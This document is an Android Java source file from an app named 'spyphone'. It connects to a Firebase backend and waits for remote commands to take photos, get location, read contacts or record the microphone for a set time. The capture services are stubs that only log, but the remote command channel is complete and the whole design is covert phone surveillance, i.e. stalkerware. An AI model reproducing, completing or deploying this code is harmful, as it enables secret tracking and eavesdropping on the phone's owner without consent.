package emit.esy.es.spyphone.util;

import android.content.Context;
import android.util.Log;

import com.firebase.client.AuthData;
import com.firebase.client.ChildEventListener;
import com.firebase.client.DataSnapshot;
import com.firebase.client.Firebase;
import com.firebase.client.FirebaseError;

import java.util.HashMap;
import java.util.Map;

import emit.esy.es.spyphone.R;

/**
 * Created by Emil Makovac on 24/04/2015.
 */
public class FirebaseUtil {

    private static final String LOG_TAG = "FirebaseUtil";
    String username, password;
    volatile String id;
    Firebase ref, userRef;
    Context context;

    public FirebaseUtil(Context context, String username, String password){
        this.context = context;
        this.username = username;
        this.password = password;
    }

    public void authenticateUser() {
        ref = new Firebase(context.getString(R.string.domain));
        ref.authWithPassword(username, password, new Firebase.AuthResultHandler() {

            @Override
            public void onAuthenticated(AuthData authData) {
                id = authData.getUid();
                Log.d(LOG_TAG, "Authenticate user ID- " + id);
                setUpChildRef();
            }

            @Override
            public void onAuthenticationError(FirebaseError firebaseError) {
                //If error == no such user, create user
                switch (firebaseError.getCode()) {
                    case FirebaseError.USER_DOES_NOT_EXIST:
                        createUser();
                        break;
                }
            }
        });

    }

    public void setUpChildRef() {
        Log.d(LOG_TAG, "setUpChildRef");
        if(id != null){

            Log.d(LOG_TAG, "setUpChildRef - id: " + id);

            setOnline(id, true);

            userRef.addChildEventListener(new ChildEventListener() {
                @Override
                public void onChildAdded(DataSnapshot dataSnapshot, String s) {
                    String child = dataSnapshot.getValue().toString();
                    Log.d("ChildAdded", dataSnapshot.getKey() +" : "+child);

                }

                @Override
                public void onChildChanged(DataSnapshot dataSnapshot, String s) {
                    String child = dataSnapshot.getKey();

                    Log.d("ChildChanged", child);

                    //check if androidRead has changed
                    if(child.equals("androidRead")){
                        //check if androidRead has a string or a map of strings as a value
                        try{
                            //if is a string
                            String childValue = (String)dataSnapshot.getValue();
                            switch (childValue){
                                case "photo":
                                    Log.d(LOG_TAG, "Starting photo service");
                                    setOnDefaultAndroidRead(dataSnapshot);
                                    break;
                                case "cords":
                                    Log.d(LOG_TAG, "Starting geo service");
                                    setOnDefaultAndroidRead(dataSnapshot);
                                    break;
                                case "contacts":
                                    Log.d(LOG_TAG, "Starting contacts service");
                                    setOnDefaultAndroidRead(dataSnapshot);
                                    break;
                                default:
                                    Log.d(LOG_TAG, "Wrong action, nothing to start. Value is " + childValue);
                                    break;
                            }
                        } catch (Exception e){
                            //if is a map of strings
                            Map<String, Object> childValue;
                            childValue = (Map<String, Object>) dataSnapshot.getValue();
                            String action = childValue.get("action").toString();

                            switch (action){
                                case "mic":
                                    long duration = (long) childValue.get("secondParam");
                                    Log.d(LOG_TAG, "Starting mic service with duration " + Long.toString(duration) + " sec");
                                    //create intent to start microphone recording service with duration of recording

                                    setOnDefaultAndroidRead(dataSnapshot);
                                    break;
                            }
                        }

                    }

                }

                @Override
                public void onChildRemoved(DataSnapshot dataSnapshot) {

                }

                @Override
                public void onChildMoved(DataSnapshot dataSnapshot, String s) {

                }

                @Override
                public void onCancelled(FirebaseError firebaseError) {

                }
            });

        }
    }

    private void setOnDefaultAndroidRead(DataSnapshot dataSnapshot) {
        Log.d(LOG_TAG, "androidRead set to null");
        dataSnapshot.getRef().setValue("null");
    }

    private void createUser() {
        ref.createUser(username, password, new Firebase.ValueResultHandler<Map<String, Object>>() {

            @Override
            public void onSuccess(Map<String, Object> result) {
                Log.d(LOG_TAG, "CreateUser SUCCESS");
                Log.d(LOG_TAG, "CreateUser ID- " + result.get("uid").toString());
                id= result.get("uid").toString();
                setOnline(id, false);
                //authenticate user
                authenticateUser();

            }

            @Override
            public void onError(FirebaseError firebaseError) {
                Log.d(LOG_TAG, "CreateUser ERROR");
            }
        });
    }

    private void setOnline(String id, boolean b) {
        userRef = ref.child(id);
        Map<String, Object> user = new HashMap<String, Object>();
        user.put("isOnline", b);
        user.put("androidRead", "null");
        Map<String, Object> connOnline = new HashMap<String, Object>();
        connOnline.put("isOnline", false);
        if(b){
            userRef.updateChildren(user);
            userRef.onDisconnect().updateChildren(connOnline);
        } else {
            userRef.setValue(user);
            userRef.onDisconnect().updateChildren(connOnline);
        }
    }
}
